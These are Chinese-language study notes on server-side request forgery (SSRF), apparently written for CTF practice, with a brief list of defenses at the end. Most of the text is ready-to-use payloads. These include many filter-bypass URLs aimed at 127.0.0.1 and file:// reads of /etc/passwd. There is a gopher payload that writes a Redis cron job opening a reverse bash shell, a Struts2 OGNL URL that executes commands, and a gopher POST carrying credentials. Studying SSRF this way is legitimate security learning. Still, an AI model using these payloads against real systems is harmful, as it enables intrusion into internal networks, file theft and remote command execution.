# SSRF

参考链接：[SSRF漏洞（原理、挖掘点、漏洞利用、修复建议） - Saint_Michael - 博客园 (cnblogs.com)](https://www.cnblogs.com/miruier/p/13907150.html)

Gopher协议详解：[Gopher协议在SSRF漏洞中的深入研究（附视频讲解） - 知乎 (zhihu.com)](https://zhuanlan.zhihu.com/p/112055947)

## 定义

SSRF Server-Side Request Forgery服务器端请求伪造

一种由攻击者构造形成由服务端发起请求的一个安全漏洞

SSRF一般攻击的都是外网无法访问的内部系统

SSRF形成的原因大多都是由于服务端提供了从其他服务器应用获取数据的功能且没有对目标地址做过滤与限制



最简单就是外部应用直接访问通过图片应用访问127.0.0.1/xxxx的文件





漏洞 出现的地方

- 社交分享功能：获取超链接的标签等内容进行显示
- 转码服务：通过URL地址把源地址的网页内容调优使其适合手机屏幕浏览
- 在线翻译：给网址翻译对应网页的内容
- 图片加载/下载：例如富文本编辑器中的点击下载图片到本地，通过URL地址加载或下载图片
- 图片/文章收藏功能：主要其会取URL地址中的title以及文本的内容作为显示以求一个好的用户体验
- 云服务厂商：远程执行命令判断网站是否存活
- 网站采集：网站抓取的地方
- 数据库内置函数：数据库mongodb的copyDatabase函数等
- 邮件系统：接手邮件服务器地址
- 编码处理：属性信息处理，文件处理，如ffpmg，ImageMagick，docx，pdf，xml处理器等
- 未公开的api实现以及其他扩展调用URL功能，利用google语法加关键字查询



URL关键参数

- share
- wap
- url
- link
- src
- source
- target
- u
- display
- sourceURL
- imageURL
- domain



白盒审计：文件读取，文件加载，数据操作





漏洞产生函数：

```
file_get_contents()、fsockopen()、curl_exec()、fopen()、readfile()
```



## 漏洞验证方法



## SSRF 伪协议利用

```
http://	Web常见访问
file://	from文件系统get文件内容，如file:///etc/passwd
dict://	字典服务器协议，访问字典资源，如dict:///ip:6739/info:
sftp://	SSH文件传输协议或安全文件传输协议
ldap://	轻量级目录访问协议
tftp://	简单文件传输协议
gopher://	分布式文档传递服务，可以使用gopherus生成payload
```



例如：

```
url=http://127.0.0.1/flag.php
```

```
url=file:///var/www/html/flag.php
```









## SSRF绕过



### 1.域名限制

限制为`http://www.xxx.com`固定域名

采用http基本身份认证方式绕过

```
http://www.xxx.com@www.xxyy.com
```



### 2.请求IP限制

限制请求IP不为内网地址，绕过方法：

- 采取短链接绕过
- 域名解析绕过
- 进制转换
- 采取302重定向跳转







#### IP地址纯进制绕过

原payload

```
url=http://127.0.0.1/flag.php
```

十六进制

```
url=http://0x7F.0.0.1/flag.php
```

八进制

```
url=http://0177.0.0.1/flag.php
```

十进制整数格式

```
url=http://2130706433/flag.php
```

16进制整数格式

```
url=http://0x7F000001/flag.php
```

省略模式，也适用于长度限制绕过

```
url=http://127.1/flag.php
```

CIDR绕过localhost

```
url=http://127.127.127.127/flag.php
```



0方式绕过，也适用于长度限制绕过

```
url=http://0/flag.php
url=http://0.0.0.0/flag.php
```



#### 端口号绕过

```
url=http://127.0.0.1：8080/flag.php
```



#### [::]绕过

```
url=http://[::]:80
```



#### 短链接绕过

```
test.xxx.com -> 127.0.0.1
url=http://test.xxx.com/flag.php
```



#### 长度限制IP绕过

```
url=http://127.1/flag.php
url=http://0/flag.php
```



#### 重定向解析绕过

```php
<?php
    header("Location:http://127.0.0.1/flag.php");
```



#### match、@、#绕过

要是有匹配进行match，固定要某个字符的话，可以选择这种方式：

如强行要求数据中带有ctf、show等字样：

```
url=http://ctf.@137.0.0.1/flag.php#show
```



#### :冒号绕过

```
url=http?/127.0.0.1/flag.php
```



#### 句号绕过

```
url=http://127。0。0。1/index.php
```



#### 域名匹配绕过

比如限制必须xip.io传进来的就可以：

```
xip.io127.0.0.1.xip.io -->127.0.0.1
www.127.0.0.1.xip.io -->127.0.0.1
Haha.127.0.0.1.xip.io -->127.0.0.1
Haha.xixi.127.0.0.1.xip.io -->127.0.0.1
```



打数据库就用dict伪协议



打内网还可以用ssrf探针探测目标ip有没有开其他的网络服务，通过其他的漏洞进行触发SQL漏洞 and 1=1





==gopher协议==

协议工具链生成工具：[Gopherus](https://github.com/tarunkant/Gopherus)



一键弹bash：

```
url=gopher://127.0.0.1:6379/_*1 %0d %0a $8%0d %0aflushall %0d %0a*3 %0d %0a $3%0d %0aset %0d %0a $1%0d %0a1 %0d %0a $64%0d %0a %0d %0a %0a %0a*/1 * * * * bash -i >& /dev/tcp/127.0.0.1/4444 0>&1 %0a %0a %0a %0a %0a %0d %0a %0d %0a %0d %0a*4 %0d %0a $6%0d %0aconfig %0d %0a $3%0d %0aset %0d %0a $3%0d %0adir %0d %0a $16%0d %0a/var/spool/cron/ %0d %0a*4 %0d %0a $6%0d %0aconfig %0d %0a $3%0d %0aset %0d %0a $10%0d %0adbfilename %0d %0a $4%0d %0aroot %0d %0a*1 %0d %0a $4%0d %0asave %0d %0aquit %0d %0a"
```



### 漏洞作用

#### 内网扫描可用端口及服务

```
url=http://127.0.0.1:80
...

0~65535遍历即可，查看返回码
```



#### 对内网主机和端口发送请求包攻击



以下是针对内网192.168.1.139这台服务器进行攻击，执行命令whoami

```
http://localhost/ssrf.php?url=http://192.168.1.139:8081/${%23context['xwork.MethodAccessor.denyMethodExecution']=false,%23f=%23_memberAccess.getClass().getDeclaredField('allowStaticMethodAccess'),%23f.setAccessible(true),%23f.set(%23_memberAccess,true),@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec('whoami').getInputStream())}.action
```



POST方法就使用：

```
http://localhost/ssrf.php?url=gopher://192.168.1.124:6667/_POST%20%2findex.php%20HTTP%2f1.1%250d%250aHost%3A%20127.0.0.1%3A2233%250d%250aConnection%3A%20close%250d%250aContent-Type%3A%20application%2fx-www-form-urlencoded%250d%250a%250d%250ausername%3Dadmin%26password%3Dpassword
```



#### 请求本地文件

这里的构成可以通过 url参数接收，去尝试请求内网资源

```
url=file:///c:\\windows\\csup.txt
```



```
url=file:////etc/csup.txt
```



#### Redis攻击

这里有必要深入了解gopher协议了：[Gopher协议在SSRF漏洞中的深入研究（附视频讲解） - 知乎 (zhihu.com)](https://zhuanlan.zhihu.com/p/112055947)

跳转至下方：



## 防御措施

- 限制端口为Web端口，访问方式限制为http
- 限制不能访问内网的ip
- 屏蔽返回的详细信息，这样只能盲注，入侵难度上升了



## Gopher协议

一个过时的协议

信息查找系统，在www出现之前，是最主要的信息检索工具，具体使用TCP 70端口

如今已经很少使用了，但却是SSRF漏洞利用中最强大的协议



使用限制：

| PHP                                   | Java       | Curl         | Perl | ASP.NET   |
| ------------------------------------- | ---------- | ------------ | ---- | --------- |
| --wite-curlwrappers且php版本至少为5.3 | 小于JDK1.7 | 低版本不支持 | 支持 | 小于版本3 |



```
URL:gopher://<host>:<port>/<gopher-path>_TCP数据流
```



post请求中，回车换行需要使用%0d%0a



发送GET请求：



gopher协议发送数据包流程：

1. 构造http数据包
2. URL编码、替换回车换行为%0d%0a
3. 发送gopher协议
4. 问号转码为%3f
5. 回车换行记得人工转码，不然可能就只有%0a
6. %0d%0a表示消息结束



SSRF反弹shell

PHP版本必须≥5.3，并且在PHP.ini文件开启extension=php_curl.dll









